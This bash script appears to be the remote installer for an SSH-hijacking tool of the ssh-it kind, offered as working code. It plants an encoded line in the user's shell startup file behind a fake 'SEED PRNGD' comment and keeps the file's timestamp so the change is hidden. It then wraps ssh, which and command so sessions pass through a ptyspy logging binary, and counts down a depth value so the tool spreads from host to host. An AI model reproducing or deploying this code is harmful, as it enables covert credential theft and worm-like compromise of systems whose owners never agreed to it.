#! /usr/bin/env bash

# This script is executed on a new remote side _before_ binaries have been deployed.
# This script sets up everything on the remote side:
# - Add to ~/.profile
# - link to correct binary for host's architecture.

CY="\033[1;33m" # yellow
CG="\033[1;32m" # green
CR="\033[1;31m" # red
CC="\033[1;36m" # cyan
CM="\033[1;35m" # magenta
CN="\033[0m"    # none

DEBUGF()
{
	[[ -z $THC_DEBUG ]] && return
	echo >&2 "$@"
}

DEBUGF_R()
{
	[[ -z $THC_DEBUG ]] && return
	echo -e >&2 "${CR}$@${CN}"
}

rcfile_add()
{
	local rcfile="$1"

	RCLINE=$(echo "${THC_BASEDIR}"'/seed' |xxd -ps -c1024)
	RCLINE_ENC="source \$(echo $RCLINE|xxd -r -ps#PRNGD) 2>/dev/null"

	RCLINE=""
	(head -n1 "${rcfile}" && \
		echo "# DO NOT REMOVE THIS LINE. SEED PRNGD."
		echo $RCLINE_ENC && \
		tail -n +2 "${rcfile}") >"${rcfile}-new" 2>/dev/null || exit 0

	touch -r "${rcfile}" "${rcfile}-new"
	mv "${rcfile}-new" "${rcfile}"
}

rcfile_del()
{
	local rcfile="$1"
	local data

	data=$(grep -v PRNGD "${rcfile}")
	echo "$data" >"${rcfile}" || { echo "failed"; exit 91; }
}

try_basedir()
{
	[[ -z $1 ]] && return 1

	if [[ ! -d "${1}" ]]; then
		mkdir -p "${1}" 2>/dev/null || return 1 # Can't create directory
	else
		touch "${1}/.write" || return 1 # Not writeable
		rm -f "${1}/.write" 2>/dev/null
	fi

	THC_BASEDIR="${1}"
	DEBUGF "Using THC_BASEDIR=$THC_BASEDIR"
	return 0
}

osarch()
{
	local os;

	# OSARCH already set. Needed when cross compiling to force OSARCH
	[[ -n $OSARCH ]] && { echo "$OSARCH"; return; }
	# Find the correct binary for this architecture and link it
	arch=$(uname -m)
	if [[ $OSTYPE == *linux* ]]; then
		if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
		        os="i386-alpine"
		elif [[ "$arch" == "armv6l" ]] || [[ "$arch" == "armv7l" ]]; then
		        os="armv6l-linux" # RPI-Zero / RPI 4b+
		elif [[ "$arch" == "aarch64" ]]; then
		        os="aarch64-linux"
		elif [[ "$arch" == "mips64" ]]; then
		        os="mips64-alpine"
		elif [[ x"$arch" == *mips* ]]; then
		        os="mips32-alpine"
		fi
	elif [[ $OSTYPE == *darwin* ]]; then
	    if [[ "$arch" == "arm64" ]]; then
	            os="x86_64-osx" # M1
	    else
	            os="x86_64-osx"
	    fi
	elif [[ $OSTYPE == *FreeBSD* ]]; then
	    os="x86_64-freebsd"
	fi

	[[ -z "$os" ]] && os="x86_64-alpine" # Default: Try Alpine(muscl libc) 64bit

	echo "$os"
}

[[ "$1" = "osarch" ]] && { osarch; exit; }

# if [[ -n $1 ]]; then
# 	[[ "$1" = "osarch" ]] && valid_param=1
# 	[[ "$1" = "uninstall" ]] && valid_param=1
# 	[[ "$1" = "clean" ]] && valid_param=1
# 	[[ -z $valid_param ]] && 
# fi


# Find a writeable base dir
try_basedir "${THC_BASEDIR}" || \
try_basedir "${HOME}/.prng" || \
try_basedir "/dev/shm/.prng/u-${UID}" || \
try_basedir "/tmp/.prng/u-${UID}" || \
{ echo >&2 "Can't find a suitable directory."; exit 98; }

# deterime if system-side is already installed
# Exit if installed in either of the two system wide include scripts
# [[ -f /etc/bash.bashrc ]] && RCFILE="/etc/bash.bashrc" && grep PRNGD /etc/bash.bashrc &>/dev/null && IS_INSTALLED_RCFILE_SYSTEM=1
[[ -f /etc/profile     ]] && RCFILE_SYSTEM="/etc/profile"     && grep PRNGD /etc/profile     &>/dev/null && IS_INSTALLED_RCFILE_SYSTEM=1

# determine if local is already installed
[[ -z $RCFILE_USER ]] && [[ $SHELL =~ zsh ]] && [[ -f $HOME/.zshrc ]] && RCFILE_USER=$HOME/.zshrc
[[ -z $RCFILE_USER ]] && [[ $SHELL =~ bash ]] && [[ -f $HOME/.bash_profile ]] && RCFILE_USER=$HOME/.bash_profile
[[ -z $RCFILE_USER ]] && [[ $SHELL =~ bash ]] && [[ -f $HOME/.bash_login ]] && RCFILE_USER=$HOME/.bash_login
[[ -z $RCFILE_USER ]] && [[ -f $HOME/.profile ]] && RCFILE_USER=$HOME/.profile
[[ -n $RCFILE_USER ]] && grep PRNGD "${RCFILE_USER}" &>/dev/null && IS_INSTALLED_RCFILE_USER=1

# FIXME: if UID=0 then install systemwide to RCFILE_SYSTEM
RCFILE="$RCFILE_USER"

# no RCFILE found...
[[ -z $RCFILE ]] && { echo >&2 "No rcfile found"; exit 0; }

if [[ "$1" = "uninstall" ]]; then
	[[ -n $IS_INSTALLED_RCFILE_USER   ]] && rcfile_del "$RCFILE_USER"
	[[ -n $IS_INSTALLED_RCFILE_SYSTEM ]] && rcfile_del "$RCFILE_SYSTEM"
	echo -e "--> You may want to clean up with"
	echo -e "--> \033[1;36mrm -rf \"${THC_BASEDIR:-ERRORNOTSET}\"; unset -f ssh sudo thc_set1\033[0m"
	exit 0
fi

if [[ -z $IS_INSTALLED_RCFILE_SYSTEM ]] && [[ -z $IS_INSTALLED_RCFILE_USER ]]; then
	rcfile_add "$RCFILE"
# FIXME: If root user then try to install globally (if /etc/ is writeabl...).
fi

### Add my stub file that is sourced from rcfile on login
echo "export THC_BASEDIR=\"${THC_BASEDIR}\"
export THC_VERBOSE=\"${THC_VERBOSE}\"
export THC_TESTING=\"${THC_TESTING}\"
THC_PS_NAME=\"\$(basename \$SHELL 2>/dev/null)\"
export THC_PS_NAME=\"-\${THC_PS_NAME:-bash}\"
THC_ORIG_SSH=\"\$(command -v ssh)\"
#THC_ORIG_SUDO=\"\$(command -v sudo)\"
thc_set1()
{
	unset -f ssh sudo 2>/dev/null
	ssh()
	{
		if [[ -f \"${THC_BASEDIR}/ssh\" ]]; then
			THC_TARGET=\"\$THC_ORIG_SSH\" \"${THC_BASEDIR}/ssh\" \$@
		else
			\$THC_ORIG1 \$@
		fi
	}
	#sudo()
	#{
	#	if [[ -f \"${THC_BASEDIR}/sudo\" ]]; then
	#		THC_TARGET=\"\$THC_ORIG_SUDO\" \"${THC_BASEDIR}/sudo\" \$@
	#	else
	#		\$THC_ORIG2 \$@
	#	fi
	#}
	which()
	{
		unset -f ssh sudo which command 2>/dev/null
		which \$@ && { thc_set1; true; } || { thc_set1; false; }
	}
	command()
	{
		unset -f ssh sudo which command 2>/dev/null
		command \$@ && { thc_set1; true; } || { thc_set1; false; }
	}
}
thc_set1" >"${THC_BASEDIR}/seed"

[[ -z $FSIZE_BIN ]] && { echo >&2 "FSIZE_BIN not set"; exit 99; }

# Un-block the real ssh (to continue)
[[ -z $THC_LOCAL ]] && echo THCPROFILE

# On OSX, tar wont terminate at end of archive. Thus we need to use FSIZE_BIN to
# kick an EOF to tar.
(cd "$THC_BASEDIR" && { head -c${FSIZE_BIN} | tar xfz -; }) || exit 97
# (cd "$THC_BASEDIR" && tar xf -) || exit 97 # THIS WONT COMPLETE EVER OSX

# Newly backdoored. Decrement depth by 1. This will stop ssh-it when THC_DEPTH hits 0.
[[ -z $THC_DEPTH ]] && { echo >&2 "ERROR: THC_DEPTH not set."; exit 96; }
THC_DEPTH_REMOTE="$THC_DEPTH"
# On THC_LOCAL (local install, not via ssh) deep the current THC_DEPTH (do not decrement)
[[ -z $THC_LOCAL ]] && [[ $THC_DEPTH_REMOTE -gt 0 ]] && THC_DEPTH_REMOTE=$((THC_DEPTH_REMOTE - 1))
# Check if local THC_DEPTH already exists and only update new
# DEPTH is LARGER to prevent DEPTH hitting 0 if A connects -> B -> A -> B..
source "${THC_BASEDIR}/depth.cfg" 2>/dev/null || unset THC_DEPTH
echo "T=$THC_DEPTH"
[[ -n $THC_FORCE_UPDATE ]] && unset THC_DEPTH # always use THC_DEPTH_REMOTE
if [[ $THC_DEPTH_REMOTE > $THC_DEPTH ]]; then
	echo "THC_DEPTH=${THC_DEPTH_REMOTE}" >"${THC_BASEDIR}/depth.cfg"
	THC_DEPTH="$THC_DEPTH_REMOTE"
	echo >&2 "Setting THC_DEPTH=$THC_DEPTH"
else
	echo >&2 "Keeping THC_DEPTH=$THC_DEPTH (REMOTE wants $THC_DEPTH_REMOTE)"
fi

OSARCH=$(osarch)

# Test execute on this architecture
THC_EXEC_TEST=1 "${THC_BASEDIR}/ptyspy_bin.${OSARCH}" 2>/dev/null  || { echo >&2 "Failed: ptyspy_bin.${OSARCH}"; exit 127; }

ln -sf "ptyspy_bin.${OSARCH}" "${THC_BASEDIR}/ssh"

if [[ -n $THC_LOCAL ]]; then
	echo -e "--> Installed to ${CY}${THC_BASEDIR}${CN} and ${CY}${RCFILE}${CN}."
	echo -e "--> Logging to ${CY}${THC_BASEDIR}/.l${CN}"
	echo -e "--> Type ${CC}${THC_BASEDIR}/x.sh uninstall${CN} to remove."
	echo -e "--> Intercepting will start on next log in or to start right"
	echo -e "    now type ${CC}source ${THC_BASEDIR}/seed${CN}."
fi

exit 0
